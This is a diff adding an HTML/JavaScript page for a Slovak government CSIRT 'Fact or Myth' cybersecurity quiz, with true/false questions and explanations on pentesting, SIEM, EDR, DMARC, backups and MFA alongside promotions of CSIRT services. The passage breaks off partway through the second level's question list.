@@ -1,0 +1,1616 @@
+<!doctype html>
+<html lang="sk">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Kyberbezpečnostná hra – Fakt alebo Mýtus | Vládna jednotka CSIRT</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="style.css">
+
+  <link rel="shortcut icon" href="https://csirt.sk/wp-content/themes/csirt/assets/img/csirt_no_text.svg">
+  <link rel="apple-touch-icon" href="https://csirt.sk/wp-content/themes/csirt/assets/img/icon.png">
+
+</head>
+
+<body>
+  <header class="ak-topbar">
+    <div class="ak-topbar-inner">
+      <div class="ak-brand">
+        <span class="ak-mark" aria-hidden="true"></span>
+        <div>
+          <h1 id="brandTitle">Kyberbezpečnostná hra – Fakt alebo Mýtus | Vládna jednotka CSIRT</h1>
+          <p id="brandSubtitle">Interaktívna hra o kyberbezpečnosti • otestujte svoje znalosti a spoznajte služby VJ CSIRT</p>
+        </div>
+      </div>
+
+      <div class="ak-actions">
+        <button class="ak-btn" id="btnReset" type="button" title="Vymazať uložený progres v tomto prehliadači">
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M3 12a9 9 0 0 1 15.36-6.36" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            <path d="M18 3v6h-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M21 12a9 9 0 0 1-15.36 6.36" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            <path d="M6 21v-6h6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          Reset úrovne
+        </button>
+
+        <button class="ak-btn primary" id="btnAbout" type="button">
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M12 17v-6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            <path d="M12 8h.01" stroke="currentColor" stroke-width="3" stroke-linecap="round"/>
+            <path d="M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" stroke="currentColor" stroke-width="2"/>
+          </svg>
+          Ako to funguje
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <div class="ak-wrap">
+    <section class="ak-hero">
+      <h2 id="heroTitle">Otestujte svoje znalosti kyberbezpečnosti</h2>
+      <p id="heroText">Kliknite na políčko, rozhodnite, či ide o fakt alebo mýtus, a zistite správnu odpoveď spolu s vysvetlením a odporúčaniami.</p>
+      <p id="heroLinks"></p>
+
+      <div class="ak-levelnav" id="levelNav" aria-label="Výber úrovne">
+        <label for="levelSelect">Úroveň:</label>
+        <select id="levelSelect" class="ak-select" aria-label="Vyber úroveň hry"></select>
+      </div>
+      <div class="ak-unlock-box" id="unlockBox" hidden></div><br>
+
+      <div class="ak-progress">
+        <span id="progressText">0/30 hotovo</span>
+        <span id="scoreText"></span>
+        <span class="ak-bar" aria-hidden="true"><i id="progressBar"></i></span>
+      </div>
+    </section>
+
+    <main class="ak-main">
+      <div class="ak-grid" id="grid" aria-label="Kyberbezpečnostná hra s otázkami"></div>
+    </main>
+  </div>
+
+  <div class="ak-modal" id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="ak-dialog" role="document">
+      <div class="ak-dialog-head">
+        <div class="ak-dialog-title">
+          <strong id="modalTitle">Okienko</strong>
+          <span id="modalSubtitle">Fakt alebo Mýtus</span>
+        </div>
+        <button class="ak-iconbtn" id="btnClose" type="button" aria-label="Zavrieť">
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </button>
+      </div>
+
+      <div class="ak-dialog-body">
+        <div class="ak-flipwrap">
+          <div class="ak-flip" id="flip">
+            <div class="ak-card front">
+              <h2 class="ak-qtitle" id="qTitle">Otázka</h2>
+              <div class="ak-qtext" id="qText">Text otázky…</div>
+
+              <div class="ak-choices">
+                <button class="ak-choice fact" id="btnFact" type="button" aria-label="Odpoveď: Fakt">
+                  ✅ Fakt
+                </button>
+                <button class="ak-choice myth" id="btnMyth" type="button" aria-label="Odpoveď: Mýtus">
+                  🧯 Mýtus
+                </button>
+              </div>
+
+              <p class="ak-note" id="noteLocal">Pozn.: Odpoveď sa ukladá iba v tomto prehliadači (localStorage).</p>
+            </div>
+
+            <div class="ak-card back" aria-live="polite">
+              <h3 class="ak-qtitle" id="qTitleBack"></h3>
+              <div class="ak-row">
+                <span class="ak-pill" id="resultPill">Výsledok</span>
+                <span class="ak-pill" id="correctPill">Správne: –</span>
+              </div>
+              <div class="ak-explain" id="explainText">Vysvetlenie…</div>
+              <p class="ak-note" id="extraTip"></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ak-toast" id="toast" aria-live="polite"></div>
+
+  <script type="text/javascript">
+    const LEVELS = {
+    1: {
+      id: 1,
+      title: "Kyberbezpe\u010dnostn\u00e1 hra \u2013 Fakt alebo M\u00fdtus | Vl\u00e1dna jednotka CSIRT",
+      brandTitle: "Kyberbezpe\u010dnostn\u00e1 hra \u2013 Fakt alebo M\u00fdtus | Vl\u00e1dna jednotka CSIRT",
+      brandSubtitle: "Interakt\u00edvna hra o kyberbezpe\u010dnosti \u2022 otestujte svoje znalosti a spoznajte slu\u017eby VJ CSIRT",
+      heroTitle: "Otestujte svoje znalosti kyberbezpe\u010dnosti",
+      heroText: "Kliknite na pol\u00ed\u010dko, rozhodnite, \u010di ide o fakt alebo m\u00fdtus, a zistite spr\u00e1vnu odpove\u010f spolu s vysvetlen\u00edm a odpor\u00fa\u010daniami.",
+      heroLinksHtml: "Vedomosti si m\u00f4\u017ee\u0161 roz\u0161\u00edri\u0165 ako jednotlivec na na\u0161om vedomostnom <a href='https://ctf.kyberakademia.sk/' target='_blank' rel='noopener noreferrer'>port\u00e1li CTF</a> alebo ako t\u00edm v na\u0161om <a href='https://kyberarena.csirt.sk/' target='_blank' rel='noopener noreferrer'>V\u00fdcvikovom a \u0161koliacom stredisku, Kyberar\u00e9na</a>.",
+      hidden: false,
+      questions: [
+        // 1
+        {
+          q: "Penetračný test = sken zraniteľností.",
+          correct: false,
+          e: "Sken zraniteľností je automatizovaný proces, ktorý hľadá známe slabiny. Penetračný test ide ďalej – manuálne overuje zneužiteľnosť, testuje biznis logiku a využíva aj kreatívne techniky. Zraniteľnosti objavené analytikmi VJ CSIRT nájdete v sekcii <a href='https://csirt.sk/zranitelnosti.html' target='_blank'>Objavené zraniteľnosti</a>."
+        },
+        // 2
+        {
+          q: "Antivírus dokáže odhaliť všetky aj úplne nové, neznáme kyberhrozby.",
+          correct: false,
+          e: "Antivírusy sú silné pri známych hrozbách, no pri úplne nových útokoch majú limity. Preto sa používajú aj pokročilejšie prístupy (napr. behaviorálne systémy/EDR), ktoré sledujú správanie a podozrivé aktivity."
+        },
+        // 3
+        {
+          q: "SOC a SIEM sú to isté.",
+          correct: false,
+          e: "SIEM (Security Information and Event Management) je technická platforma na zber, koreláciu a analýzu logov. SOC (Security Operations Center) je tím expertov, ktorí SIEM (a ďalšie nástroje) používajú na monitoring, detekciu, analýzu a riešenie incidentov."
+        },
+        // 4
+        {
+          e: "Ste prekvapení, že tu nič nie je? Rovnako Vás môžu prekvapiť aj hackeri. Nenechajte sa nachytať na hruškách a využite služby VJ CSIRT už dnes. Zapojte sa do pravidelného skenovania zraniteľností, službou <a href='https://csirt.sk/achilles' target='_blank'>Achilles</a> a <a href='https://csirt.sk/achilles' target='_blank'>Domino</a>, ktoré potrebuje každá organizácia.",
+          correct: null
+        },
+        // 5
+        {
+          q: "Threat hunter potrebuje na svoju prácu iné dáta než incident responder.",
+          correct: true,
+          e: "Incident responder rieši už vzniknutý incident a pracuje s presnými, aktuálnymi a detailnými dátami. Threat hunter pátra po skrytých/dlhodobých hrozbách, hľadá anomálie a vzorce správania, preto potrebuje širší mix historických, behaviorálnych a korelačných dát."
+        },
+        // 6
+        {
+          q: "Sken zraniteľností dokáže odhaliť aj logické chyby v aplikácii.",
+          correct: false,
+          e: "Automatizované skenery výborne detegujú známe slabiny (konfigurácie, chýbajúce záplaty, zastarané komponenty, typické technické zraniteľnosti). Logické chyby sú však špecifické pre konkrétnu aplikáciu a vyžadujú manuálne testovanie a pochopenie kontextu."
+        },
+        // 7
+        {
+          q: "Indikátory kompromitácie (IOC) sú vždy dostačujúce na odhalenie aktívneho útoku.",
+          correct: false,
+          e: "IOC samy o sebe často nestačia: útočníci ich menia, sú reakčné a bez kontextu veľa nepovedia. Treba sledovať aj správanie, anomálie a mať neustály dohľad."
+        },
+        // 8
+        {
+          q: "Ak implementujem Zero Trust, nepotrebujem ďalšie bezpečnostné mechanizmy.",
+          correct: false,
+          e: "Zero Trust nie je produkt, ale prístup „nikomu never, všetko overuj“. Neodstraňuje klasické opatrenia – práve naopak, spolieha sa na ich integráciu (identity, segmentácia, monitoring, kontrola komunikácie)."
+        },
+        // 9
+        {
+          q: "Red teaming neslúži ako náhrada klasického pentestu.",
+          correct: true,
+          e: "Pentest hľadá technické zraniteľnosti v definovanom rozsahu, red teaming simuluje reálneho útočníka a testuje schopnosť organizácie útok rozpoznať a reagovať. Nenahrádzajú sa – dopĺňajú sa."
+        },
+        // 10
+        {
+          q: "IDS a IPS plnia rovnakú úlohu – oboje aktívne blokujú útoky.",
+          correct: false,
+          e: "IDS (Intrusion Detection System) monitoruje a upozorňuje (pasívne, neblokuje). IPS (Intrusion Prevention System) je v ceste komunikácie a vie premávku aktívne zastaviť/odmietnuť. IDS deteguje, IPS zasahuje."
+        },
+        // 11
+        {
+          q: "Threat intelligence sa získava iba z otvorených zdrojov.",
+          correct: false,
+          e: "TI môže pochádzať aj z komerčných zdrojov, uzavretých komunít/partnerstiev, interných zdrojov (logy, incidenty, honeypoty) či vládnych výstrah. OSINT je len časť."
+        },
+        // 12
+        {
+          q: "Moderný malvér dokáže úplne obísť behaviorálne detekčné mechanizmy tým, že sa spúšťa výhradne v pamäti.",
+          correct: false,
+          e: "Fileless malvér je ťažšie detegovateľný (neukladá súbory na disk), ale nedokáže „úplne“ obísť behaviorálnu detekciu. Moderné EDR/XDR sledujú správanie procesov, anomálie, skripty, prácu s pamäťou či laterálne pohyby."
+        },
+        // 13
+        {
+          q: "Používanie dlhých passphrase (viacslovných hesiel) je bezpečnejšie než krátke, komplexné heslá.",
+          correct: true,
+          e: "Dĺžka hesla výrazne zvyšuje odolnosť voči brute-force. Správne zvolené passphrase dávajú lepší pomer bezpečnosť/použiteľnosť. Pozor: ak je passphrase krátka alebo predvídateľná, výhoda sa stráca."
+        },
+        // 14
+        {
+          q: "Nedostatočné logovanie môže znemožniť spoľahlivú rekonštrukciu priebehu incidentu.",
+          correct: true,
+          e: "Bez kvalitných, časovo synchronizovaných a dostatočne detailných logov nevieš určiť čo sa stalo, kedy, v akom poradí a s akým dopadom. To komplikuje incident response aj forenznú analýzu."
+        },
+        // 15
+        {
+          e: "Ste prekvapení, že tu nič nie je? Rovnako Vás môžu prekvapiť aj hackeri. Nenechajte sa nachytať na hruškách a využite služby VJ CSIRT už dnes. Zapojte sa do služby penetračného testovania a revízie bezpečnostnej konfigurácie, <a href='https://csirt.sk/ares' target='_blank'>Ares</a>.",
+          correct: null,
+        },
+        // 16
+        {
+          q: "IPS môže blokovať aj legitímnu premávku.",
+          correct: true,
+          e: "IPS (Intrustion Prevention System) môže blokovať legitímnu premávku, napr. pri nedostatočnom tuning-u, zmenách v aplikáciách bez aktualizácie politík alebo pri šifrovanej premávke s obmedzeným kontextom. Preto sa často nasadzuje najprv v detekčnom režime."
+        },
+        // 17
+        {
+          q: "Forenzná analýza počítača dokáže obnoviť všetky vymazané súbory.",
+          correct: false,
+          e: "Závisí od spôsobu vymazania, času a ďalšieho používania zariadenia. Časť dát sa niekedy dá obnoviť, no nie vždy – niektoré súbory môžu byť nenávratne stratené."
+        },
+        // 18
+        {
+          e: "Ste prekvapení, že tu nič nie je? Rovnako Vás môžu prekvapiť aj hackeri. Nenechajte sa nachytať na hruškách a využite služby VJ CSIRT už dnes. Pokiaľ máte vlastný SOC, neváhajte a zapojte sa do služby zdieľania informácií o hrozbách, <a href='https://csirt.sk/afrodita' target='_blank'>Afrodita</a>.",
+          correct: null,
+        },
+        // 19
+        {
+          q: "Odstránenie malvéru zo zariadenia automaticky znamená, že je opäť bezpečné.",
+          correct: false,
+          e: "Odstránenie škodlivého kódu nezaručuje plnú bezpečnosť: mohli vzniknúť zadné vrátka, perzistencia, kompromitované účty alebo odcudzené prihlasovacie údaje. Po incidente býva potrebná hĺbková analýza, zmena hesiel, aktualizácie a často aj preinštalovanie."
+        },
+        // 20
+        {
+          q: "Aktualizácie sú potrebné iba vtedy, keď opravujú funkčné chyby alebo keď systém vykazuje problémy.",
+          correct: false,
+          e: "Aktualizácie často opravujú bezpečnostné zraniteľnosti, ktoré útočníci zneužívajú. Systém môže fungovať „bezchybne“ a zároveň byť zraniteľný. Aktualizovať treba pravidelne."
+        },
+        // 21
+        {
+          e: "Ste prekvapení, že tu nič nie je? Rovnako Vás môžu prekvapiť aj hackeri. Nenechajte sa nachytať na hruškách a využite služby VJ CSIRT už dnes. Hľadáte možnosti ako využiť služby bezpečnostného monitoringu. Neváhajte a zapojte sa do služby včasného varovania, <a href='https://csirt.sk/ews' target='_blank'>Systém včasného varovania</a>. Pozor, ponuka je časovo obmedzená.",
+          correct: null,
+        },
+        // 22
+        {
+          q: "Threat hunting je proaktívna aktivita a nečaká na bezpečnostné upozornenie.",
+          correct: true,
+          e: "Aktívne vyhľadávanie hrozieb (angl. Threat hunting) je aktívne hľadanie hrozieb – vychádza z hypotéz, správania útočníkov a dát, aby odhalil veci, ktoré automatická detekcia prehliadla. Najnebezpečnejšie útoky často nevyvolajú alarm."
+        },
+        // 23
+        {
+          q: "Sandbox analýza dokáže odhaliť správanie každého typu malvéru.",
+          correct: false,
+          e: "Sandbox umožňuje bezpečne analyzovať podozrivé súbory, no pokročilý malvér sa vie analýze vyhnúť alebo zmeniť správanie. Preto VJ CSIRT pri analýze incidentov využíva kombináciu viacerých techník, vrátane behaviorálnej analýzy, threat intelligence a forenzných metód. Zverejnené analýzy malvéru od VJ CSIRT sú dostupné v našej knižnici v sekcii <a href='https://csirt.sk/malverove-analyzy.html' target='_blank'>Malvér analýzy</a>",
+          tip: "Kombinácia viacerých bezpečnostných techník výrazne zvyšuje úspešnosť detekcie hrozieb."
+        },
+        // 24
+        {
+          q: "Počas sviatkov rastie riziko úspešných útokov, pretože útočníci cielia na zmeny v prevádzke a dostupnosti tímov.",
+          correct: true,
+          e: "Počas sviatkov bývajú tímy oslabené, reakčné časy dlhšie a prevádzka sa mení (zástupy, dočasné prístupy). Útočníci to využívajú – najmä phishingom, ransomvérom a útokmi mimo bežných hodín."
+        },
+        // 25
+        {
+          q: "Pri kybernetickom incidente je najdôležitejšie konať rýchlo a koordinovane.",
+          correct: true,
+          e: "Rýchla identifikácia a analýza incidentu výrazne znižuje dopady na organizáciu. Vládna jednotka CSIRT poskytuje podporu pri riešení bezpečnostných incidentov – od analýzy až po odporúčania na obnovu bezpečnosti, po žiadosti o súčinnosť od organizácie. Incidenty musia subjekty verejnej správy <a href='https://csirt.sk/nahlasit-incident.html' target='_blank'>nahlasovať</a> aj keď organizácia nevyžaduje súčinnosť VJ CSIRT.",
+          tip: "V prípade incidentu kontaktujte VJ CSIRT čo najskôr – skorá reakcia minimalizuje škody."
+        },
+        // 26
+        {
+          q: "Ak má web stránka HTTPS, znamená to, že je bezpečná.",
+          correct: false,
+          e: "HTTPS iba šifruje komunikáciu medzi používateľom a webom, ale negarantuje, že stránka je dôveryhodná. Phishingové stránky tiež bežne používajú certifikáty HTTPS. Znamená to len zabezpečný prenos dát, nie bezpečný obsah."
+        },
+        // 27
+        {
+          q: "Penetračné testovanie dokáže odhaliť reálne scenáre útoku ešte pred útočníkom.",
+          correct: false,
+          e: "Penetračné testovanie simuluje správanie útočníka, jeho cieľom je identifikovať čo najviac zraniteľností, ktoré automatické nástroje nevedia nájsť. Jeho cieľom nie je overiť postupy a reakcie bezpečnostného tímu na hrozby. Služba <a href='https://csirt.sk/registracia-ares.html' target='_blank'>Ares</a> od VJ CSIRT pomáha organizáciám posilniť bezpečnosť svojich systémov.",
+          tip: "Testovanie reakcie bezpečnostného tímu bez vopred oznámenej činnosti simulujúcej správanie útočníke je súčasťou tzv. testovania Red Teaming."
+        },
+        // 28
+        {
+          q: "Keď do svojho počítača nič nesťahujem, nemôžem mať v zariadení malvér.",
+          correct: false,
+          e: "Malvér sa môže dostať do zariadenia aj cez škodlivé reklamy, infikované weby alebo zraniteľnosti v prehliadači. Niekedy stačí len navštíviť kompromitovanú stránku. Sťahovanie súborov je len jedna z mnohých ciest infekcie.",
+        },
+        // 29
+        {
+          q: "Zdieľanie informácií o hrozbách pomáha predchádzať útokom.",
+          correct: true,
+          e: "Zdieľanie indikátorov kompromitácie a informácií o hrozbách umožňuje organizáciám rýchlejšie identifikovať a zastaviť hrozby. Služba <a href='https://www.csirt.sk/afrodita' target='_blank'>Afrodita</a> poskytuje aktuálne informácie o kybernetických hrozbách.",
+          tip: "Informácie o hrozbách pomáhajú zlepšiť detekciu aj prevenciu."
+        },
+        // 30
+        {
+          q: "VPN robí používateľa úplne anonymným na internete.",
+          correct: false,
+          e: "VPN iba skrýva IP adresu pred niektorými službami a šifruje prenos k VPN serveru. Komunikáciu stále môžu identifikovať cookies, účty, fingerprinting prehliadača alebo samotný poskytovateľ VPN. Je to nástroj na súkromie, nie neviditeľnosť.",
+        }
+      ]
+    },
+    2: {
+      id: 2,
+      title: "Kyberbezpe\u010dnostn\u00e1 hra 2 \u2013 Mierne pokro\u010dil\u00fd | Vl\u00e1dna jednotka CSIRT",
+      brandTitle: "Kyberbezpe\u010dnostn\u00e1 hra 2 \u2013 Mierne pokro\u010dil\u00fd | Vl\u00e1dna jednotka CSIRT",
+      brandSubtitle: "Mierne pokro\u010dil\u00e1 \u00farove\u0148 \u2022 technickej\u0161ie ot\u00e1zky z praxe CSIRT a kybernetickej bezpe\u010dnosti",
+      heroTitle: "Mierne pokro\u010dil\u00e1 \u00farove\u0148: technickej\u0161ie ot\u00e1zky",
+      heroText: "Kliknite na pol\u00ed\u010dko, rozhodnite, \u010di ide o fakt alebo m\u00fdtus, a zistite spr\u00e1vnu odpove\u010f spolu s vysvetlen\u00edm a odpor\u00fa\u010daniami.",
+      heroLinksHtml: "Vedomosti si m\u00f4\u017ee\u0161 roz\u0161\u00edri\u0165 ako jednotlivec na na\u0161om vedomostnom <a href='https://ctf.kyberakademia.sk/' target='_blank' rel='noopener noreferrer'>port\u00e1li CTF</a> alebo ako t\u00edm v na\u0161om <a href='https://kyberarena.csirt.sk/' target='_blank' rel='noopener noreferrer'>V\u00fdcvikovom a \u0161koliacom stredisku, Kyberar\u00e9na</a>.",
+      hidden: false,
+      questions: [
+        // 1
+        {
+          q: "SIEM korelácia sama o sebe negarantuje, že detekuje všetky útoky bez tuning-u a kontextu.",
+          correct: true,
+          e: "SIEM zbiera a koreluje udalosti, ale kvalita detekcie závisí od zdrojov logov, ich normalizácie, pravidiel, prahov a kontextu prostredia. Bez priebežného ladania (tuning) a validácie vzniká veľa falošných poplachov aj slepých miest.",
+          tip: "Priebežne zlepšujte logovanie, korelačné pravidlá a overujte ich na reálnych incidentoch."
+        },
+        // 2
+        {
+          q: "EDR je zameraný primárne na koncové stanice a sleduje správanie procesov, nie iba súbory na disku.",
+          correct: true,
+          e: "EDR typicky zbiera telemetriu z endpointov (procesy, prístupy k pamäti, registry, sieťové spojenia) a umožňuje lov hrozieb aj rýchlu reakciu. To je dôležité aj pri fileless technikách.",
+          tip: "Ak máte EDR, nastavte zber relevantnej telemetrie a jasné reakcie prostredníctvom reakcií, tzv. playbooks."
+        },
+        // 3
+        {
+          q: "DMARC je mechanizmus, ktorý pomáha znižovať spoofing domény v e-mailoch tým, že vyhodnocuje SPF a DKIM.",
+          correct: true,
+          e: "DMARC definuje politiku (napr. quarantine/reject) a reportovanie na základe výsledkov SPF/DKIM a zarovnania domén. Výrazne pomáha pri ochrane pred phishingom zneužívajúcim vašu doménu.",
+          tip: "Nasadzujte DMARC postupne (monitoring → quarantine → reject) a vyhodnocujte reporty."
+        },
+        // 4
+        {
+          q: "Ak je DNS komunikácia šifrovaná (DoH/DoT), nie je možné detegovať podozrivé domény.",
+          correct: false,
+          e: "Šifrovanie DNS sťažuje pasívne pozorovanie, ale organizácie môžu stále detegovať anomálie inými spôsobmi: endpoint telemetria, proxy, TLS SNI/JA3 (kde relevantné), reputačné feedy, alebo vlastné DNS resolvery s politikami.",
+          tip: "Zvážte politiky pre DNS resolvery a koreláciu DNS udalostí s endpoint a sieťovou telemetriou."
+        },
+        // 5
+        {
+          q: "IOC (indikátor kompromitácie) je vždy lepší než IOA/behaviorálny indikátor, lebo je presnejší.",
+          correct: false,
+          e: "IOC (hash, IP, doména) je často krátkodobý a útočník ho vie zmeniť. IOA/behaviorálne znaky (napr. reťazenie procesov, anomálne prístupy) bývajú odolnejšie voči zmenám a sú vhodné na detekciu rodín techník.",
+          tip: "Kombinujte IOC aj behaviorálne detekcie a pravidelne obnovujte feedy."
+        },
+        // 6
+        {
+          q: "Zálohy odolné voči ransomvéru by mali zahŕňať aj offline/immutable kópie.",
+          correct: true,
+          e: "Ransomvér často cieli aj na online zálohy a zálohovacie účty. Offline alebo nemenné (immutable) zálohy znižujú riziko ich zničenia a umožňujú obnovu.",
+          tip: "Testujte obnovu (restore) a chráňte zálohovacie účty MFA a minimálnymi právami."
+        },
+        // 7
+        {
+          q: "Princíp minimálnych oprávnení (least privilege) znižuje dopad kompromitácie účtu.",
+          correct: true,
+          e: "Ak kompromitovaný účet nemá nadbytočné oprávnenia, útočník má menší priestor na laterálny pohyb a eskaláciu. Je to základný princíp kybernetickej hygieny.",
+          tip: "Pravidelne revidujte roly, skupiny a delegované oprávnenia (aj v AD/Entra ID)."
+        },
+        // 8
+        {
+          q: "Pri reakcii na incidenty je dôležité zachovať časovú presnosť logov (NTP) kvôli korelácii udalostí.",
+          correct: true,
+          e: "Bez synchronizácie času je ťažké skladať časovú os incidentu, korelovať udalosti naprieč systémami a spoľahlivo určiť priebeh kompromitácie.",
+          tip: "Kontrolujte NTP na serveroch, sieťových prvkoch aj bezpečnostných nástrojoch."
+        },
+        // 9
+        {
+          q: "Sken zraniteľností (napr. Achilles) dokáže sám potvrdiť zneužitie zraniteľnosti v produkcii.",
+          correct: false,
+          e: "Sken zraniteľností typicky identifikuje potenciálnu slabinu alebo konfiguráciu. Potvrdenie zneužitia vyžaduje forenznú analýzu, logy, EDR nálezy alebo ďalšie dôkazy.",
+          tip: "Ak máte podozrenie na zneužitie, sledujte logy a IOC/IOA, prípadne kontaktujte CSIRT."
+        },
+        // 10
+        {
+          q: "CVSS skóre je hlavné kritérium, podľa ktorého treba priorizovať inštaláciu záplat.",
+          correct: false,
+          e: "CVSS je užitočné, ale priorizácia má zohľadniť aj dostupnosť exploitu, exponovanosť služby, hodnotu aktíva pre organizáciu, aktuálne kompenzačné opatrenia a prebiehajúce kampane (napr. varovania od VJ CSIRT).",
+          tip: "Zaraďte do svojich procesov aj informácie o hrozbách (threat intelligence, napr. Afrodita od VJ CSIRT) a inventár exponovaných služieb."
+        },
+        // 11
+        {
+          q: "YARA pravidlá sa používajú na identifikáciu malvéru a artefaktov podľa vzorov v súboroch alebo pamäti.",
+          correct: true,
+          e: "YARA umožňuje definovať signatúry na základe reťazcov, štruktúr a podmienok. V praxi sa používa pri analýze malvéru, triáži a huntingu.",
+          tip: "Pravidlá testujte na reprezentatívnych vzorkách, aby ste znížili false positives."
+        },
+        // 12
+        {
+          q: "Sandbox analýza môže zlyhať, ak malvér používa anti-VM/anti-sandbox techniky.",
+          correct: true,
+          e: "Pokročilé vzorky vedia detegovať virtuálne prostredie alebo čakajú na špecifické podmienky (čas, interakcie). Preto sa analýza kombinuje s ďalšími metódami.",
+          tip: "Kombinujte sandbox s behaviorálnou telemetriou, sieťovou analýzou a forenzikou."
+        },
+        // 13
+        {
+          q: "Certifikát využívaný protokolom TLS (ľudovo nazývaný TLS certifikát) sám o sebe negarantuje dôveryhodnosť webu.",
+          correct: true,
+          e: "TLS rieši šifrovanie prenosu, nie úmysel webu. Phishingové stránky často používajú platné certifikáty, aby pôsobili dôveryhodnejšie.",
+          tip: "Overujte doménu, reputáciu adresy a kontext, v akom Vám bola správa doručená (ak sa do Vás konečne niekto zamiloval po rokoch len podľa fotografie online a bude Vás navždy milovať, ale potreboval by od Vás najprv od 100 do 100 000 EUR, tak je potrebné spozornieť), nejde iba o ikonu zámku v prehliadači."
+        },
+        // 14
+        {
+          q: "Segmentácia siete a obmedzenie komunkácie prostredníctvom bezpečnostnej politiky na zariadené firewall pomáha obmedziť laterálny pohyb útočníka po kompromitácii jedného zariadenia.",
+          correct: true,
+          e: "Správna segmentácia a pravidlá komunikácie môžu zastaviť alebo spomaliť šírenie útoku a uľahčiť jeho včasnú detekciu.",
+          tip: "Zamerajte sa na segmentáciu kritických systémov a postupne na menej kritické (AD, zálohy, kľúčové informačné systémy alebo databázy), je normálne (ale nie želané), že nevymyslíte roky zanedbávanú bezpečnostnú politiku za pár dní ani týždňov."
+        },
+        // 15
+        {
+          q: "Viacfaktorová autentifikácia (MFA) je zbytočná, ak používateľ používa dlhú prístupovú frázu.",
+          correct: false,
+          e: "Aj silné heslo alebo veľmi dlhá prístupová fráza môže byť odcudzené (napr. phishing, infostealery, kompromitácia dodávateľského reťazca). MFA významne znižuje riziko zneužitia prihlasovacích údajov.",
+        },
+        // 16
+        {
+          q: "Základné zaznamenávanie udalostí v OS Windows (bez doplnkov) typicky nestačí na kvalitnú detekciu laterálneho pohybu.",
+          correct: true,
+          e: "Pre lepšiu viditeľnosť sa často používa rozšírené auditovanie, Sysmon (je však potrebné ho aktivovať / nainštalovať) alebo EDR telemetria. Bez toho môže byť reakcia na incidenty výrazne náročnejšia.",
+          tip: "Definujte minimálny základ pre zaznamenávanie udalostí (angl. logging baseline) a pravidelne ho vyhodnocujte, či je pre ciele, ktoré chcete dosiahnuť postačujúci."
+        },
+        // 17
+        {
+          q: "Kanály pre zdieľanie informácií o hrozbách (angl. threat intelligence feeds) poskytujú pridanú hodnotu aj bez kontextu alebo bez mapovania na aktíva organizácie.",
+          correct: false,
+          e: "Bez kontextu neviete, či sa indikátory týkajú vášho prostredia. Najväčšiu hodnotu majú, keď ich mapujete na exponované služby, zachytené logy a detekčné pravidlá.",
+          tip: "Prepojte informácie o hrozbách s inventárom v rámci TI, SIEM/EDR a procesom incident response."
+        },
+        // 18
+        {
+          q: "Bezpečnostné testovanie konfigurácie (tzv. hardening review), napríklad prostredníctvom CIS benchmark, môže odhaliť riziká aj bez využitia exploitu.",
+          correct: true,
+          e: "Nesprávne nastavenia (slabé šifry, otvorené služby, ponechanie prednastavených účtov s dobre známymi heslami) sú častým vstupným vektorom pre útočníkov. Revízia konfigurácie patrí medzi veľmi efektívne preventívne opatrenia.",
+          tip: "Používajte benchmarky (napr. CIS), ale prispôsobte ich svojmu biznis cieľu a prevádzke."
+        },
+        // 19
+        {
+          q: "Web Application Firewall (WAF) môže slúžiť ako náhrada nepostačujúceho bezpečného vývoja aplikácií, keďže blokuje útoky na web.",
+          correct: false,
+          e: "WAF je technológia, ktorá môže pomôcť pri správnej konfigurácii, ale nie je všeliek. Neodstráni logické chyby, problém pri autorizácii ani zraniteľnosti mimo jeho detekčného rozsahu. Bezpečný vývoj a testovanie sú stále nutné.",
+          tip: "WAF berte ako doplnkovú vrstvu, nie ako jedinú a zďaleka nie postačujúcu ochranu."
+        },
+        // 20
+        {
+          q: "Útočníci často zneužívajú zraniteľnosti v službách dostupných z internetu (napr. VPN, web alebo mail) a to aj na neudržiavaných a nepoužívaných systémoch.",
+          correct: true,
+          e: "Exponované služby sú typickým vstupným bodom a to aj nepoužívané systémy (tie sú veľmi častým vstupným vektorom útorku). Preto je dôležitá inventarizácia, riadené záplat a bezpečnostný monitoring.",
+          tip: "Pravidelne kontrolujte verejne dostupné služby a ich verzie/konfigurácie, môžete na to využiť systém Achilles."
+        },
+        // 21
+        {
+          q: "Reakcia na incident vždy začína okamžitým vypnutím kompromitovaných systémov alebo vymazaním škodlivého kódu.",
+          correct: false,
+          e: "Okamžité vypnutie môže zničiť volatilné dôkazy (napr. pamäť alebo procesy) a značne skomplikovať analýzu. Postup závisí od situácie; často je vhodnejšia sieťová izolácia systémov, zber dôkazov a koordinovaná reakcia podľa pokynov expertov.",
+          tip: "Majte pripravené plány a reakcie na jednotlivé typy incidentov a rozhodovací strom pre izoláciu systémov alebo dočasné odstavenie."
+        },
+        // 22
+        {
+          q: "Zodpovedné zverejňovanie zraniteľností (angl. coordinated vulnerability disclosure, CVD) pomáha zlepšovať bezpečnosť ekosystému.",
+          correct: true,
+          e: "Zodpovedné zverejňovanie zraniteľností umožňuje dodávateľovi pripraviť opravu a používateľom aplikovať potrebné opatrenia na znížrenie rizika zneužitia zraniteľnosti. CSIRT tímy často podporujú koordináciu a vydávajú výstrahy.",
+          tip: "Majte proces na príjem hlásení o zraniteľnostiach a bezpečnostný kontakt pre hlásenie zraniteľností (toto je pre správcov informačných technológií verejnej správy aj povinnosť)."
+        },
+        // 23
+        {
